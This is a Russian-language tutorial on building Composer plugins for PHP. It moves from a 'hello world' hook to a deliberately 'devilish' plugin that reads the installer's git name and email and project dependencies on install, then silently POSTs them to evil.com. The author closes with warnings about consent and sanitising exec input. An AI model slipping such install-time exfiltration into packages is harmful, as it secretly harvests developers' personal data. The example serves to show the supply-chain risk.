<code>Composer</code> - это самый важный инструмент в наборе современного PHP-разработчика. Времена ручного управления зависимостями остались в далеком прошлом, и их место заняли такие замечательные вещи как <code>Semver</code>. Вещи, которые помогают нам спать по ночам, ведь мы можем обновлять наши зависимости не обрушивая все вокруг. 
<img width="300" align="center" src="https://habrastorage.org/files/35a/ecb/e45/35aecbe4572644cb8663d9b31e046298.jpg" alt="neanderthal smashing rocks">
Хоть мы и используем <code>Composer</code> довольно часто, не все знают о том, как расширить его возможности. Такая мысль даже не возникает, ведь он и так делает свою работу хорошо по-умолчанию, и кажется, что это не стоит времени или усилий, чтобы попытаться или хотя бы изучить. Даже в официальной документации <a href="https://getcomposer.org/doc/articles/plugins.md">обходят стороной этот вопрос</a>. Наверное, потому что никто не спрашивает...

Однако, недавние изменения сделали разработку плагинов для <code>Composer</code> намного легче. Сам же <code>Composer</code> также недавно перешел из альфа-версии в бету, пожалуй, это самый консервативный цикл релизов из когда-либо задуманных. Этот инструмент, который изменил современный PHP-мир, сделал его таким, каким мы видим его сейчас. Этот краеугольный камень профессиональной разработки PHP. Он просто перешел из альфы в бету.

Итак, сегодня я подумал, что мне бы хотелось исследовать возможности composer-плагинов, и по ходу дела создать немного свежей документации.

<i>Вы можете найти код этого плагина на <a href="https://github.com/assertchris-tutorials/tutorial-composer-plugins">Github</a>.</i><cut/>

<h2>Приступая к работе</h2>
Для начала, нам нужно создать репозиторий с плагином, отдельно от приложения, в котором мы будем его использовать. Плагины устанавливаются как и обычные зависимости. Давайте созданим новую папку и положим туда <code>composer.json</code> файл:
<source>
{
    "type": "composer-plugin",
    "name": "habrahabr/plugin",
    "require": {
        "composer-plugin-api": "^1.0"
    }
}
</source>
Каждая из этих строчек важна! Мы присваиваем этому плагину тип <code>composer-plugin</code> для того, чтобы иметь доступ к хукам жизненного цикла <code>Composer</code>, которые мы будем использовать.

Мы даем имя плагину, чтобы наше приложение могло добавить его в зависимости. Вы можете использовать все остальные переменные по вашему усмотрению, но запомните как вы назвали плагин, это нам понадобится позже.

Также необходимо проставить зависимость с <code>composer-plugin-api</code>. Указанная версия важна, потому что наш плагин будет рассматриваться как совместимый с определенной версией API плагинов, что в свою очередь влияет на такие вещи, как, например, метод подписей.

Далее нам нужно указать класс для автозагрузки плагина:
<source>
"autoload": {
    "psr-4": {
        "HabraHabr\\": "src"
    }
},
"extra": {
    "class": "HabraHabr\\Plugin"
}
</source>
Создаем папку <code>src</code> с файлом <code>Plugin.php</code>. Вот код, который отработает на первом хуке в жизненном цикле <code>Composer</code>:
<source lang="php">
namespace HabraHabr;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class Plugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        print "hello world";
    }
}
</source>
<code>PluginInterface</code> описывает наличие публичного метода <code>activate</code>, который вызывается после загрузки плагина. Давайте убедимся, что наш плагин работае. Перейдем в наше приложение и создадим для него <code>composer.json</code>:
<source>
{
    "name": "habrahabr/app",
    "require": {
        "habrahabr/plugin": "*"
    },
    "repositories": [
        {
            "type": "path",
            "url": "../habrahabr-plugin"
        }
    ],
    "minimum-stability": "dev",
    "prefer-stable": true
}
</source>
Это значительно проще, чем раньше и больше похоже на то, как люди будут использовать ваш плагин. Лучшим решением было бы выпустить стабильные версии вашего плагина через Packagist, но пока вы разрабатываете и так нормально. Конфиг сообщает <code>Composer</code>'у что нужно запросить любые имеющиеся версии <code>habrahabr/plugin</code> и указывает источник для зависимости.

Путь к репозиторию относительный, поэтому Composer автоматически сделает symlink и заботится об этом вам не придется. И раз уж мы завязываемся на нестабильной зависимости, то давайте укажем минимально-требуемый уровень как <code>dev</code>.

<i>В подобных ситуациях все же будет предпочтительней использовать стабильные версии библиотек там, где это возможно...</i>

Теперь при запуске <code>composer install</code> из папки приложения вы увидите сообщение <code>hello world</code>! И все это без какого либо размещения кода на <a href="https://github.com">на github</a> или <a href="https://packagist.org">Packagist</a>.

<i>Я рекомендую использовать команду <code>rm -rf vendor composer.lock; composer install</code> во время разработки. Особенно, когда вы начнете работать с папками для установки!</i>

<h2>Исследуем возможности</h2>
<i>Также хорошей идеей будет поставить в зависимости <code>composer/composer</code>, это упростит нам работу с интерфейсами и классами, которые в будущем нам понадобятся.</i>

Большую часть того, что вы узнаете о плагинах, вы можете найти глядя на исходные коды <code>Composer</code>. В качестве альтернативы можно воспользоваться дебаггером и проверить весь ход исполнения, начиная с метода <code>activate</code>. Также, если вы используете IDE, например <a href="https://www.jetbrains.com/phpstorm">PHPStorm</a>, наличие исходников облегчит изучение и поможет легко перемещаться между вашим кодом и кодом менеджера зависимостей.

Например, мы можем проинспектировать <code>$composer->getPackage()</code>, чтобы увидеть для чего нужна та или иная переменная в файле <code>composer.json</code>. Также <code>Composer</code> предоставляет возможность задавать вопросы во время процесса установки, используя <code>$io->ask("...")</code>.

<h2>Давайте это используем!</h2>
Начнем же наконец-то делать что-то практичное и, возможно, немного дьявольское! Давайте сделаем так, чтобы наш плагин отслеживал действия пользователей и зависимости, которые они требуют. Начнем с поиска их имени и почты, указанных в <code>git</code>:
<source lang="php">
public function activate(Composer $composer, IOInterface $io)
{
    exec("git config --global user.name", $name);
    exec("git config --global user.email", $email);

    $payload = [];

    if (count($name) > 0) {
        $payload["name"] = $name[0];
    }

    if (count($email) > 0) {
        $payload["email"] = $email[0];
    }
}
</source>
Имена пользователей и адреса электронной почты обычно хранятся в глобальном конфиге <code>git</code>, команда <code>git config --global user.name</code>, выполненная в терминале, вернет их. Выполнив их через <code>exec</code> мы получим результаты в нашем плагине.

Теперь, давайте отследим имя приложения (если оно определено), а также набор зависимостей и их версий. То же самое сделаем для <code>dev</code>-зависимостей, сделаем обеих групп общий метод:
<source lang="php">
private function addDependencies($type, array $dependencies, array $payload)
{
    $payload = array_slice($payload, 0);

    if (count($dependencies) > 0) {
        $payload[$type] = [];
    }

    foreach ($dependencies as $dependency) {
        $name = $dependency->getTarget();
        $version = $dependency->getPrettyConstraint();

        $payload[$type][$name] = $version;
    }

    return $payload;
}
</source>
Мы получаем название и ограничения по версии для каждой из библитоек и добавляем их в массив <code>$payload</code>. Вызов <code>array_slice</code> гарантирует нам отсутствие побочных эффектов этого метода, при многократном вызове мы получим точно такие же результаты.

<i>Подобную реазилацию часто называют <code>pure function</code>, или примером использования неизменяемых переменных.</i>

Теперь давайте используем этот метод и передадим ему массивы с зависимостями:
<source lang="php">
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    $app = $composer->getPackage()->getName();

    if ($app) {
        $payload["app"] = $app;
    }

    $payload = $this->addDependencies(
        "requires",
        $composer->getPackage()->getRequires(),
        $payload
    );

    $payload = $this->addDependencies(
        "dev-requires",
        $composer->getPackage()->getDevRequires(),
        $payload
    );
}
</source>
И наконец, мы можем отправить эти данные куда-нибудь:
<source lang="php">
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    // ...get project details

    $context = stream_context_create([
        "http" => [
            "method" => "POST",
            "timeout" => 0.5,
            "content" => http_build_query($payload),
        ],
    ]);

    @file_get_contents("https://evil.com", false, $context);
}
</source>
Мы могли бы использовать <a href="http://docs.guzzlephp.org">Guzzle</a> для этого, но <code>file_get_contents</code> работает также хорошо. По сути, все что нужно сделать - <code>POST</code> запрос на <code>https://evil.com</code> с сериализированными данными.

<h2>Будь хорошим</h2>
Я ни в коем случае не призываю вас собирать в тайне собирать пользовательские данные. Но, возможно, полезно знать, сколько данных может кто-то собрать, с помощью простой зависимость к хорошо продуманному <code>Composer</code>-плагину.

Конечно, можно использовать опцию <code>composer install --no-plugins</code>, но множество фреймворков и систем управления контентом зависят от плагинов, требующихся для их правильной установки.

Несколько дополнительных предупреждений:
<ol>
<li>Если вы собираетесь использовать <code>exec</code>, фильтруйте и проверяйте любые данные, которые не указаны жестко в коде. В противном случае вы создаете вектор атаки на ваш код.</li>
<li>Если вы отправляете данные, отправляйте их по HTTPS. Иначе другие люди доберутся до них.</li>
<li>Не отслеживайте пользовательские данные без согласия. Задавайте вопрос перед тем, как начать сбор, делайте это каждый раз! Что-то вроде <code>IOInterface::ask("...")</code> - как раз то, что вам нужно...</li>
</ol>
Помогла ли вам эта статья? Возможно, у вас есть идея для плагина; например свой плагин-установщик для библиотек, или плагин, который загружает оффлайн документацию для популярных проектов. Дайте знать в комментариях ниже...